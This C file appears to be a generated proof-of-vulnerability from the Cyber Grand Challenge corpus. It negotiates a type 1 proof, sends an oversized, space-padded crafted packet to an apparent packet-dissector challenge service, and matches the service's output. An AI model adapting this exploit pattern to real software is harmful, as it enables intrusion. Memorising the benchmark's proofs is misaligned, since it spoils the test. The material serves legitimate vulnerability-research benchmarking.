#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x62\xae\x86\xd3"
         "\xc3\xfd\x9b\x28\xb4\x5f\xe6\x5b\x04\x01\x00\x00\xc6\xa8\x91\x0e"
         "\x4e\xe8\x03\xcb\x0e\xa0\x05\x12\x37\xd0\x33\x3a\x07\x0f\xd5\xdb"
         "\x44\x48\x00\x40\x18\xe1\x6a\x1d\xd4\xb0\xa5\xb3\x9b\x4e\xec\xa0"
         "\x6d\x49\x49\x6d\xca\x3b\xe6\xe3\x87\xf1\x6a\xb7\xc4\x16\x67\x58"
         "\x29\xb8\xbf\x7e\xc7\xfe\xdd\xda\x39\x11\xf3\xe3\xe6\xa0\x9c\x64"
         "\xd0\xf8\x50\x7f\x25\x69\xe8\x05\x85\xe6\xc7\x5d\xaa\x03\x00\xa4"
         "\x23\xa2\x23\x40\x07\x5c\x68\x21\x89\x56\x3b\x5b\x73\x7e\xd7\x53"
         "\x42\xe2\x0c\x2d\x61\x2b\x26\xe2\x50\x96\x0e\xe7\xcf\xcc\x16\x08"
         "\x40\x77\xe9\xc8\xa1\x6f\x0b\x88\x63\x33\xca\x71\xcb\x29\x74\xae"
         "\xab\xe6\xdf\x63\x94\x67\x15\x7b\x1b\xac\xf8\x7d\xc4\xb0\xe6\xba"
         "\xa3\xbf\xa7\x8c\x4d\xe7\xa1\x8d\x55\x97\xa8\xd6\xfd\x94\x6f\x80"
         "\xf4\x22\x9e\xa2\xd4\xb5\xa2\xa8\x58\x2a\x36\x08\x4b\xb5\xa2\x24"
         "\x3e\x9c\x2d\xaa\x22\xec\x03\xc5\x44\x0f\x45\x14\x81\xad\xb6\x0c"
         "\x99\x8b\x0e\xcc\xe6\x55\x5d\xf2\xb2\x82\xbc\x00\xc1\xa7\x41\x65"
         "\x14\xd1\x4b\x16\xbb\x7b\xfa\x8f\x79\x8d\x1a\x69\x02\x0a\x32\x33"
         "\x74\xf3\x53\xb4\x11\x69\x11\x4e\xdd\xf0\xa3\xab\x60\x29\x03\x1d"
         "\x94\x61\x8c\x16\x59\x5c\x1d\x6c\x23\x74\x9b\xcd\x40\xd7\xb0\x78"
         "\xbf\x55\xc9\xf8\xa2\x5b\x57\xf9\x96\x73\x9f\xff\x96\x91\xac\x99"
         "\x8e\xff\x13\x24\xf4\x97\xc6\x9d\xa2\x53\x60\x28\xf8\x59\x66\x5e"
         "\x11\xaf\x55\xce\x4e\x00\xc9\x88\xc4\x7c\xe3\x0f\xd6\x95\xf4\xbc"
         "\xc6\x4e\x00\x89\xf7\x0a\xdb\xa7\x83\xe5\xcf\xd3\xc8\x07\x63\x9b"
         "\xbe\x4f\xda\x9d\xfa\x0a\x17\xa8\x38\x74\x06\xe8\x6d\x89\xa0\x61"
         "\x7c\x34\x49\x4e\x00\x4e\x4e\x00\xc2\x37\xf0\x8b\x8f\x8b\x5f\x07"
         "\xfd\xdd\x89\x92\x81\xd2\x38\xa5\xab\x50\xbb\x3b\xa3\x69\x5c\x88"
         "\x16\xb2\xc4\x9f\x6f\x3d\x7b\x7e\x54\xe3\x8b\x59\x1f\x19\x13\xd2"
         "\x15\xcb\x67\x47\xe0\x09\x6a\x63\x2d\x78\x68\x20\x62\xbf\x7e\x76"
         "\x53\x9c\xfe\xda\x23\x91\x22\x68\xa0\x3f\xeb\x83\xa8\x20\x05\x7d"
         "\x83\xff\x07\x1b\x16\x5b\x6f\xc7\xf1\xba\xf2\x91\xbe\x0c\x6a\x91"
         "\x0c\xef\xcf\x56\x4b\x21\x3e\xe7\xc3\x71\x6b\x05\x59\x9b\x71\x4b"
         "\x48\xb8\x0f\xd7\xd6\x3e\x8d\xd0\x29\xb6\x01\xc8\x7b\x61\xac\x16"
         "\x63\xf6\xcb\xa3\x48\x5a\x50\x47\x70\x0b\xec\x6e\x04\x2d\xef\xe1"
         "\x57\x44\x8a\x5d\xa2\xb2\x7c\x07\x41\xe7\x77\x8d\xe7\x71\x97\xd2"
         "\xf0\x63\x62\x2f\x40\x05\x22\xf1\xe1\x06\x11\x92\xc2\x25\xe3\xcb"
         "\xdf\xdf\x20\x9c\xdc\x20\xe9\x08\xdf\x79\xf4\xb4\x13\x97\xc4\x4a"
         "\xe2\x0d\x9d\xd0\xc6\xcb\x79\xc4\x94\xb9\x60\x4e\x00\x1d\x6a\x4e"
         "\x16\xe4\x0a\x45\xc9\xf5\xdc\xb1\x9d\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===slutteryprivant
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x73\x6c\x75\x74\x74\x65\x72\x79\x70\x72\x69"
         "\x76\x61\x6e\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
